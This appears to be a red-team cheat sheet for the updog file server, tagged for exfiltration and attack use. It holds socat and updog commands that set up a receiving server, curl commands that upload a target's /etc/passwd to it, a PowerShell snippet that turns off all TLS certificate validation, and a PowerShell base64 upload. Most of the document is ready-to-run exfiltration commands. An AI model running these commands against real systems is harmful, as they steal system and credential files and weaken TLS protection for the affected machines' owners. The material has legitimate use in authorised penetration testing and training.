# updog

% file transfer, exfiltration, injecton

#plateform/linux #target/serve  #cat/ATTACK/LISTEN-SERVE 


## updog - start http server
#plateform/linux #target/serve  #cat/ATTACK/LISTEN-SERVE 
```bash
sudo socat TCP-LISTEN:<http_port|80>,fork TCP:localhost:<http_user_port|9090> & updog -d $(pwd) -p <http_user_port|9090> --password <updog_password>
```


## updog - start https server
#plateform/linux #target/serve  #cat/ATTACK/LISTEN-SERVE 
```bash
sudo socat TCP-LISTEN:<http_port|80>,fork TCP:localhost:<http_user_port|9090> & updog -d $(pwd) -p <http_user_port|9090> --password <updog_password> [--ssl]
```

## updog - curl upload to (http)
For secured by password use http://:<password>@<ip>:<port>/upload
```bash
curl -XPOST -F "file=@<file|/etc/passwd>;filename=<filename|passwd>" -F "path=<path|.>" http://:<updog_password>@<local_ip>:<port|80>/upload
```

## updog - curl upload to (https)
For secured by password use https://:<password>@<ip>:<port>/upload
```bash
curl -XPOST -k -F "file=@<file|/etc/passwd>;filename=<filename|passwd>" -F "path=<updog-path|.>" https://:<updog_password>@<local_ip>:<port|80>/upload
```

## updog - powershell trust certificat
```powershell
 add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
```

## updog - powershell upload (http)
For secured by password use http://:<password>@<ip>:<port>/upload
certutil -encode <infile> <outfile>
```bash
$f = Get-item <b64-file>
$body = @{
    file = $f
    path = '<path>'
}
Invoke-RestMethod -Method Post -Uri https://:<updog_password>@<local_ip>:<port|80>/upload  -Form $body -Verbose -MaximumRedirection 0
```